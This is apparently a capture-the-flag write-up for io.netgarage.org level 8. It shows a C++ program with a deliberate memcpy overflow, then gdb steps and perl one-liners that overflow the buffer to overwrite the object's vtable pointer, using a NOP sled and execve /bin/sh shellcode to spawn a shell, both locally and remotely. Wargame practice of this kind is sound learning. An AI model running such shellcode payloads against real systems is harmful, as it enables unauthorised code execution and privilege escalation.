// writen by bla for io.netgarage.org
#include <iostream>
#include <cstring>
#include <unistd.h>

class Number
{
        public:
                Number(int x) : number(x) {}
                void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));} // <== buffer overflow here
                virtual int operator+(Number &r) {return number + r.number;}
        private:
                char annotation[100];
                int number;
};


int main(int argc, char **argv)
{
        if(argc < 2) _exit(1);

        Number *x = new Number(5);
        Number *y = new Number(6);
        Number &five = *x, &six = *y;

        five.setAnnotation(argv[1]);

        return six + five;
}

local 

to download binary:
scp level8@io.netgarage.org:/levels/level08 /tmp/level08

to determine address of address of buffer:
env - /tmp/level08
env - gdb -q /tmp/level08
source /usr/local/peda/peda.py
r $(perl -e 'print "\x90"x(108-24) . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" . pack(l,0x42424242)')

EAX: 0x42424242 ('BBBB')
=> 0x8048726 <main+146>:        mov    edx,DWORD PTR [eax] <== it movs whats address in eax holds

[------------------------------------stack-------------------------------------]
[eax] >>>> 0xbffffd80 <<<< --> 0x804ea10 --> 0x80488c8 --> 0x80487e2 (<_ZN6NumberplERS_>:push   ebp)
0004| 0xbffffd84 --> 0xbfffff4e --> 0x90909090 
0008| 0xbffffd88 --> 0xbffffdb8 --> 0x0 


then paste address of address of buffer
r $(perl -e 'print "\x90"x(108-24) . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" . pack(l,0xbffffd84)')

process 381 is executing new program: /bin/bash


remote

the same principle 
env - /levels/level08 $(perl -e 'print "\x90"x(108-30) . "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80" . pack(l,0xbffffd90)')
